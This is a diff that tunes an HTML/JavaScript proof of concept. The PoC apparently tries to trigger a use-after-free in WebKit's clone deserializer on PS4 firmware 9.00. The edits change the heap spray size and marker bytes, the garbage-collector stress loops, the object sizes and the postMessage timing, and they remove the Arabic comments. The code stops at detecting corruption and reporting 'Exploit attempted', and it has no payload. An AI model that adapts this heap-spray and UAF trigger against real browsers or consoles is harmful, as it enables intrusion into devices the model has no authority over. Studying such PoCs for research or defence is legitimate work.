@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CloneDeserializer UAF PoC (PS4 9.00)</title>
+    <title>WebKit CloneDeserializer UAF PoC (PS4 9.00 Exploit)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -35,10 +35,12 @@
         function sprayHeap() {
             console.log('Spraying heap...');
             const arrays = [];
-            for (let i = 0; i < 10000; i++) { // قللنا إلى 10000
+            for (let i = 0; i < 8000; i++) {
                 const buf = new Uint8Array(4096);
-                buf[0] = 0x41; // 'A' للاختبار
-                buf[1] = 0x42; // 'B'
+                buf[0] = 0x42;
+                buf[1] = 0x43;
+                buf[2] = 0x00;
+                buf[3] = 0x00;
                 arrays.push(buf);
             }
             return arrays;
@@ -46,8 +48,8 @@
 
         function stressGC() {
             console.log('Stressing GC...');
-            for (let i = 0; i < 500; i++) { // قللنا إلى 500
-                new ArrayBuffer(1024 * 1024); // 1MB
+            for (let i = 0; i < 300; i++) {
+                new ArrayBuffer(1024 * 1024);
             }
             console.log('GC stress completed.');
         }
@@ -59,12 +61,12 @@
 
             try {
                 console.log('Creating complex object...');
-                const arrayBuffer = new ArrayBuffer(4096);
+                const arrayBuffer = new ArrayBuffer(2048);
                 const messagePort = new MessageChannel().port1;
                 const complexObject = {
                     buffer: arrayBuffer,
-                    array: new Uint8Array(1000),
-                    nested: { x: new ArrayBuffer(512) }
+                    array: new Uint8Array(500),
+                    nested: { x: new ArrayBuffer(256) }
                 };
 
                 console.log('Creating iframe...');
@@ -80,7 +82,7 @@
                 setTimeout(() => {
                     console.log('Checking memory after postMessage...');
                     const testBuf = new Uint8Array(4096);
-                    testBuf.fill(0x46); // 'F'
+                    testBuf.fill(0x46);
                     if (testBuf[0] !== 0x46) {
                         console.log('Early UAF detected!');
                         status.textContent = 'Early UAF detected!';
@@ -92,7 +94,7 @@
 
                     console.log('Scanning for UAF...');
                     for (let i = 0; i < arrays.length; i++) {
-                        if (arrays[i][0] !== 0x41 || arrays[i][1] !== 0x42) {
+                        if (arrays[i][0] !== 0x42 || arrays[i][1] !== 0x43) {
                             console.log(`UAF detected at index ${i}`);
                             status.textContent = 'UAF detected!';
                             return;
@@ -102,7 +104,7 @@
                     console.log('Exploit completed.');
                     status.textContent = 'Exploit attempted!';
                     container.removeChild(iframe);
-                }, 50); // تأخير 50ms
+                }, 75);
             } catch (err) {
                 console.error(`Error: ${err.message}`);
                 status.textContent = 'Failed: Error occurred.';
@@ -127,7 +129,6 @@
 
         window.addEventListener('message', (event) => {
             console.log('Message received:', event.data);
-            // لا نضيف stressGC هنا لتجنب التداخل
         });
     </script>
 </body>
